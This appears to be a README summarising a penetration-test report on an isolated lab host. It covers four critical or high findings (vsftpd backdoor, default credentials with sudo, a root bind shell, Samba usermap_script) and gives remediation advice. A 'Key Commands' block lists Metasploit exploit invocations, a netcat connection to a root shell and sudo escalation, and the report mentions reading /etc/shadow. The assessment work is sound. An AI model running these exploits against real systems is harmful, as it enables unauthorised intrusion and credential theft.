# S07: Vulnerability Assessment & Penetration Testing Report

## Overview

This repository holds a full VA/PT (Vulnerability Assessment and Penetration Testing) report against a single lab host. The engagement:

1. Mapped the attack surface with Nmap and cross-checked it against known vulnerability signatures using Greenbone GVM/OpenVAS.
2. Independently confirmed exploitability with controlled, manual proof-of-concept testing using Metasploit and native Linux tools.
3. Turned both result sets into a short, prioritized list of fixes.

The full report is in [S07_VAPT_Report.pdf](S07_VAPT_Report.pdf).

## Key Results

| Metric | Result |
|---|---|
| Findings fully validated with proof of concept | 4 |
| Critical-severity findings (CVSS ≥ 9.0) | 3 of 4 |
| High-severity findings | 1 of 4 |
| Independent root shells obtained | 4 separate paths |
| Sensitive data exposure confirmed | Yes (`/etc/shadow` read) |
| Automated GVM/OpenVAS scan | Configured; feed sync still in progress — no completed scan report included |

**Primary business impact:** an attacker on the same network as this host does not need a username, a password, or any special preparation. At least three separate, unauthenticated paths lead straight to full root access.

## Findings Summary

| ID | Finding | Port | Severity | CVSS 3.1 |
|---|---|---|---|---|
| F-01 | vsftpd 2.3.4 backdoor ([CVE-2011-2523](https://nvd.nist.gov/vuln/detail/CVE-2011-2523)) | 21/tcp | Critical | 9.8 |
| F-02 | Default credentials with unrestricted sudo | 22/tcp | High | 8.1 |
| F-03 | Unauthenticated root shell listener | 1524/tcp | Critical | 9.8 |
| F-04 | Samba `usermap_script` RCE ([CVE-2007-2447](https://nvd.nist.gov/vuln/detail/CVE-2007-2447)) | 139/445/tcp | Critical | 9.8 |

## Methodology

1. **Reconnaissance and network-isolation check** — confirm the target is reachable and the lab network has no route to production or external networks.
2. **Active enumeration** — full TCP port, service and OS fingerprinting with Nmap.
3. **Vulnerability analysis** — automated matching with Greenbone GVM/OpenVAS, cross-checked against NVD/CVE, Exploit-DB and the Metasploit module database.
4. **Exploitation and post-exploitation** — controlled, in-scope proof-of-concept exploitation, followed by a brief, reversible demonstration of impact.

## Key Commands

```bash
# Network isolation check
ip -br addr show
ping -c 2 192.168.100.114
ping -c 2 -W 1 8.8.8.8

# Service enumeration
sudo nmap -sV -sC -O -T4 192.168.100.114 -oN nmap_report_services.txt

# Finding 01: vsftpd backdoor
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST 192.168.100.114
exploit

# Finding 02: default credentials + sudo
ssh msfadmin@192.168.100.114
sudo -l
sudo su

# Finding 03: root shell on port 1524
nc 192.168.100.114 1524

# Finding 04: Samba usermap_script RCE
use exploit/multi/samba/usermap_script
set RHOST 192.168.100.114
exploit
```

## GVM/OpenVAS Status

GVM/OpenVAS was installed and verified on the Kali host (all setup checks passed, 95,107 NVTs indexed). At the time evidence was captured for this report, the NVT feed had reached a **Current** status, but the SCAP, CERT and GVMD_DATA feeds were still updating, and no completed scan task is included in this evidence set. Any automated-scan findings should be treated as pending until that scan is completed and reviewed — see Section 5 of the report for details.

## Priority Recommendations

1. Remove or replace the backdoored vsftpd 2.3.4 build with a verified, current version.
2. Disable the raw root shell service on port 1524, and remove whatever starts it.
3. Patch or disable Samba's username map script feature (upgrade beyond 3.0.25rc3).
4. Change the `msfadmin` password, and replace the unrestricted `(ALL) ALL` sudo rule with least-privilege access.
5. Enable SMB message signing, disable SSLv2 and weak ciphers on SMTP, and replace the expired certificate.
6. Close or firewall services that are not needed (telnet, rexec, rlogin, X11, unauthenticated VNC, and similar).
7. Finish GVM feed synchronization and run a complete authenticated scan to confirm or extend these findings.

## Repository Structure

```
s07-report/
├── README.md
├── S07_VAPT_Report.docx
├── S07_VAPT_Report.pdf
└── evidence/
    ├── nmap_report_services.txt
    └── screenshots/
        ├── figure-01-isolation-check.png
        ├── figure-02-nmap-part1.png
        ├── figure-03-nmap-part2.png
        ├── figure-04-nmap-part3.png
        ├── figure-05-gvm-check-setup.png
        ├── figure-06-gvm-web-console.png
        ├── figure-07-gvm-process-list.png
        ├── figure-08-gvm-feed-status.png
        ├── figure-09-vsftpd-first-attempt.png
        ├── figure-10-vsftpd-success.png
        ├── figure-11-vsftpd-session-verify.png
        ├── figure-12-ssh-sudo-escalation.png
        ├── figure-13-netcat-port-1524.png
        ├── figure-14-samba-exploit.png
        └── figure-15-shadow-file-read.png
```

## References

- NIST NVD, CVE-2011-2523: https://nvd.nist.gov/vuln/detail/CVE-2011-2523
- NIST NVD, CVE-2007-2447: https://nvd.nist.gov/vuln/detail/CVE-2007-2447
- FIRST, CVSS v3.1 Specification: https://www.first.org/cvss/v3.1/specification-document
- Rapid7, Metasploit Framework documentation: https://docs.metasploit.com/
- Greenbone, GVM/OpenVAS documentation: https://greenbone.github.io/docs/